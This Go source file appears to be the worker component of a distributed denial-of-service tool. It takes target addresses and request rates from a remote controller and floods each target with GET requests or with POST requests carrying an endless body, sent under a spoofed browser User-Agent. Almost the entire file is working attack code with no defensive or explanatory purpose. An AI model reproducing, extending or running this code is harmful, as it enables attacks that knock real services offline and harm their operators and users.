package main

import (
	"encoding/json"
	"fmt"
	"gra/m/v2/internal"
	"net/http"
	"time"

	"github.com/pkg/errors"
	"github.com/xshkut/roletalk-go"
)

func consumeAttackVectors(peer *roletalk.Peer, ch chan<- internal.AttackVector) {
	peer.Role(internal.ATTACKER_ROLE_NAME).OnMessage(internal.ATTACK_VECTOR_EVENT, func(im *roletalk.MessageContext) {
		av := internal.AttackVector{}

		err := json.Unmarshal(im.OriginData().Data, &av)
		if err != nil {
			logger.Fatal("Cannot unmarshal attack vector. Probably, you use an incompatible versions of this package. Try to upgrade. Thank you!")
		}

		ch <- av
	})
}

func distributeAttackVectors(ch <-chan internal.AttackVector, globalRateLimiter chan<- interface{}) {
	targets := make(map[string]chan<- float64)

	for av := range ch {
		key := buildAttackVectorKey(av)

		_, ok := targets[key]
		if !ok {
			ch := runTargetAttacker(av, globalRateLimiter)

			targets[key] = ch
		}

		t := targets[key]
		t <- av.Rate
	}
}

func buildAttackVectorKey(av internal.AttackVector) string {
	return fmt.Sprintf("%v:%v", av.Method, av.Address)
}

func attack(av internal.AttackVector) {
	switch av.Method {
	case "get":
		go runGetAttack(av.Address)
	case "post":
		go runPostAttack(av.Address)
	default:
		logger.Fatal("Unknown attack method. Probably this package is outdated. Please, update to proceed")
	}
}

func runTargetAttacker(av internal.AttackVector, globalRateLimiter chan<- interface{}) chan<- float64 {
	var reqRate float64 = av.Rate

	ch := make(chan float64)

	go func() {
		for newRate := range ch {
			reqRate = newRate
		}
	}()

	go func() {
		for {
			i := 1.0 / reqRate * 1000000
			globalRateLimiter <- struct{}{}

			time.Sleep(time.Microsecond * time.Duration(i))

			go attack(av)
		}
	}()

	return ch
}

func runGetAttack(address string) {
	logger.Info(`Running GET`, address)

	_, error := internal.MakeUserRequest(address)
	if error != nil {
		logger.Warn("Got error when doing a request:", error.Error())
		return
	}
}

type infiniteReader struct {
}

func (r infiniteReader) Read(p []byte) (n int, err error) {
	return len(p), nil
}

func makeInfiniteReader() infiniteReader {
	return infiniteReader{}
}

func runPostAttack(address string) error {
	logger.Info(`Running POST`, address)

	var req *http.Request
	var res *http.Response
	var err error

	req, err = http.NewRequest("POST", address, makeInfiniteReader())
	if err != nil {
		return errors.Wrap(err, "cannot make request")
	}

	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0")
	req.Header.Add("Connection", "keep-alive")

	res, err = http.DefaultClient.Do(req)
	if err != nil {
		logger.Info(err)
	} else {
		logger.Info("Got POST response:", res.Status, res.Body)
	}

	return nil
}
